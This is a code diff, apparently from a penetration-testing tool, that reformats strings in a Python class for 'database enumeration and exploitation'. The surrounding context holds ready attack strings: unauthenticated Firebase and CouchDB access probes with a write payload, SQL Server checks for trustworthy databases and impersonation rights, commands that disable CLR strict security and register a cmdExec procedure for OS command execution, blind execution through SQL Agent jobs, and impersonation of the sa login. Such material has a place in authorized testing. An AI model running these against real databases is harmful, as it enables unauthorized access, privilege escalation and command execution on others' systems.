@@ -14,6 +14,7 @@
 
 from typing import List, Dict, Any
 
+
 class DatabaseIntelligence:
     """Intelligence engine for database enumeration and exploitation (SQL Server, MySQL, etc.)."""
 
@@ -25,7 +26,10 @@ class DatabaseIntelligence:
                 "read_test_url": "https://{app_id}.firebaseio.com/.json",
                 "write_test_method": "PUT",
                 "write_test_payload": "{\"vuln_check\": \"insecure_access_detected\"}",
-                "config_regex": r"\"apiKey\":\s*\"([^\"]+)\",\s*\"authDomain\":\s*\"([^\"]+)\",\s*\"databaseURL\":\s*\"([^\"]+)\""
+                "config_regex": (
+                    r"\"apiKey\":\s*\"([^\"]+)\",\s*\"authDomain\":\s*\"([^\"]+)\","
+                    r"\s*\"databaseURL\":\s*\"([^\"]+)\""
+                )
             },
             "couchdb": {
                 "unauth_access_url": "http://{host}:5984/_all_dbs",
@@ -48,7 +52,11 @@ class DatabaseIntelligence:
             "check_rpc_out": "SELECT is_rpc_out_enabled FROM sys.servers WHERE name = 'LINKED_SERVER'",
             "check_user_context": "SELECT SYSTEM_USER; SELECT USER_NAME();",
             "check_trustworthy": "SELECT name, is_trustworthy_on FROM sys.databases;",
-            "check_impersonation": "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
+            "check_impersonation": (
+                "SELECT distinct b.name FROM sys.server_permissions a "
+                "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
+                "WHERE a.permission_name = 'IMPERSONATE';"
+            )
         }
 
     @staticmethod
@@ -63,7 +71,10 @@ class DatabaseIntelligence:
                     "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;"
                 ],
                 "create_assembly": "CREATE ASSEMBLY myAssembly FROM 0x4D5A...; -- (Ported from yolo-mssqlclient)",
-                "create_procedure": "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];"
+                "create_procedure": (
+                    "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) "
+                    "AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];"
+                )
             },
             "sp_start_job": "EXEC msdb.dbo.sp_start_job @job_name = '...'; -- Blind execution via SQL Agent",
             "impersonate_sa": "EXECUTE AS LOGIN = 'sa';"
